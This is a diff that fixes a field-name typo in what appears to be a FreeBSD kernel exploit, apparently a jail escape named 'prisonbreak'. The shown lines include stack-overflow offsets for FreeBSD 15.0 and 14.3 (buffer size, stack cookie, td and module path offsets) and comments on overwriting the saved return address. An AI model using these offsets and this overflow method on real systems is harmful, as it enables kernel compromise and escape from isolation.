@@ -93,7 +93,7 @@ struct print_msg {
 enum { FBSD_15_GENERIC = 0, FBSD_14_DEBUG = 1, PLATFORM_UNKNOWN = 2 };
 
 struct kernel_offsets {
-  unsigned int ipsync_buffer_overlow_size;
+  unsigned int ipsync_buffer_overflow_size;
   unsigned int stack_cookie_offset;
   unsigned int td_offset;
   unsigned int kernel_module_path_offset;
@@ -111,7 +111,7 @@ struct kernel_offsets {
 static const struct kernel_offsets koffsets[] = {
     /* FreeBSD 15.0-RELEASE GENERIC */
     {
-        .ipsync_buffer_overlow_size = 2896,
+        .ipsync_buffer_overflow_size = 2896,
         .stack_cookie_offset = 2832,
         .td_offset = 2848,                 /* 2872 - 24 */
         .kernel_module_path_offset = 2872, /* 2864 + 8 */
@@ -124,7 +124,7 @@ static const struct kernel_offsets koffsets[] = {
 
     /* FreeBSD 14.3-RELEASE GENERIC-DEBUG */
     {
-        .ipsync_buffer_overlow_size = 2896,
+        .ipsync_buffer_overflow_size = 2896,
         .stack_cookie_offset = 2832,
         .td_offset = 2872,
         .kernel_module_path_offset = 2864,
@@ -336,7 +336,7 @@ void* prisonbreak(void* arg) {
   // for other locals, padding, the stack cookie, saved registers, the caller's
   // frame pointer and finally the saved return address.
   // In other words, we need to dig a long enough tunnel.
-  int len = ko.ipsync_buffer_overlow_size;
+  int len = ko.ipsync_buffer_overflow_size;
   synchdr_t* header = malloc(len);
 
   // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
